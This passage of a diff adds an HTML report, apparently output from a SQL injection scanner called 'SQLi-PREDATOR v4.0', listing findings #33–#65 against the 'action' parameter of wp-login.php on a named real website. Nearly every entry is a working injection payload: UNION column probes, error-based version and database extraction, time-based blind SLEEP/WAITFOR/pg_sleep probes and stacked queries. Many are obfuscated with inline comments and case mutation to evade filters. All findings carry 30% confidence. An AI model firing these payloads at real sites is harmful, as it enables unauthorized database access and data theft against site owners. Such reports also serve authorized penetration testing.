+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#33:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.EQUIVALENT_REPLACEMENT</code></div>
+                <div><span class="label">Payload</span><br><code>%27 uNI/*!99999*/ON SELE/*!12345*/CT nUll -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION 1 column</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#34:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.TAB_SEPARATOR</code></div>
+                <div><span class="label">Payload</span><br><code>%2527 Uni/*!*/on SEL/**/ECT NuLL -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION 1 column</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#35:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; UNION SELECT NULL,NULL -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION 2 columns</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#36:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; UNION SELECT NULL,NULL,NULL -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION 3 columns</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#37:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; UNION SELECT NULL,NULL,NULL,NULL -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION 4 columns</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#38:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.FUNCTION_CALL_OBFUSCATION</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; UNIoN SELE/**/cT NulL,NULl,NUlL,NUlL,NUlL -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION 5 columns</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#39:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.URL_ENCODING</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; U/*%00*/nION sE/*!12345*/LECT NuLL,nUlL,nuLL,nULL,Null -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION 5 columns</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#40:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; UNION SELECT 1,2,3 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION numeric 3</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#41:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; UNION SELECT 1,2,3,4,5 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION numeric 5</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#42:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.NONE</code></div>
+                <div><span class="label">Payload</span><br><code>%27 uNION SElE/*!12345*/CT 1,2,3,4,5 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION numeric 5</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#43:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.FUNCTION_CALL_OBFUSCATION</code></div>
+                <div><span class="label">Payload</span><br><code>%2527 UnI/*!99999*/ON SEL/*!12345*/ECT 1,2,3,4,5 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION numeric 5</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#44:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; UNION SELECT VERSION(),2,3 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION version()</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#45:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.SCIENTIFIC_NOTATION</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; uNiON sel/*!*/EcT vErSION(),2,3 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION version()</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#46:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.NESTED_COMMENTS</code></div>
+                <div><span class="label">Payload</span><br><code>%2527 UNiON SELEc/*!12345*/T VERSION(),2,3 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION version()</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#47:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL ExtractValue</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#48:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e), 1) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL UpdateXML</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#49:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27; AND 1=CONVERT(INT, (SELECT @@VERSION)) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MSSQL CONVERT</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#50:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27; OR 1/@@VERSION -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MSSQL divide-by-zero</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#51:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR CAST((SELECT VERSION()) AS NUMERIC) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">PostgreSQL CAST</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#52:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.CASE_MUTATION</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; oR Cast((SE/*!*/LECT vERSIoN()) AS NuMERIC) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">PostgreSQL CAST</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#53:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.TAB_SEPARATOR</code></div>
+                <div><span class="label">Payload</span><br><code>\&#x27; or CAST((SE/*!99999*/LeCT VersION()) AS NuMERIc) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">PostgreSQL CAST</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#54:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR (SELECT SLEEP(5)) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL SLEEP</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#55:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND SLEEP(5) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL AND SLEEP</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#56:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27; OR pg_sleep(5) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">PostgreSQL pg_sleep</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#57:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27; -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MSSQL WAITFOR</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#58:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27; OR WAITFOR DELAY &#x27;0:0:5&#x27; -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MSSQL OR WAITFOR</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#59:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27; OR (SELECT dbms_lock.sleep(5) FROM dual) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Oracle SLEEP</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#60:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.EQUIVALENT_REPLACEMENT</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27; oR (SEL/*!*/Ect dbmS_locK.SL/*!99999*/eeP(5) FrOm dUAl) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Oracle SLEEP</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#61:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.UNICODE_ENCODING</code></div>
+                <div><span class="label">Payload</span><br><code>1%27 OR (SE/**/LeCT dBMs_lock.slE/*!*/eP(5) fr/*!*/OM Dual) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Oracle SLEEP</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#62:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27; AND BENCHMARK(5000000,MD5(&#x27;test&#x27;)) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL BENCHMARK</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#63:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27;; SELECT SLEEP(3) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL stacked SLEEP</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#64:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27;; WAITFOR DELAY &#x27;0:0:3&#x27; -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MSSQL stacked WAITFOR</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#65:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27;; SELECT pg_sleep(3) -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">PostgreSQL stacked pg_sleep</p></div><div class="footer">Generated by SQLi-PREDATOR v4.0 — Authorized Security Testing Only</div></div></body></html>
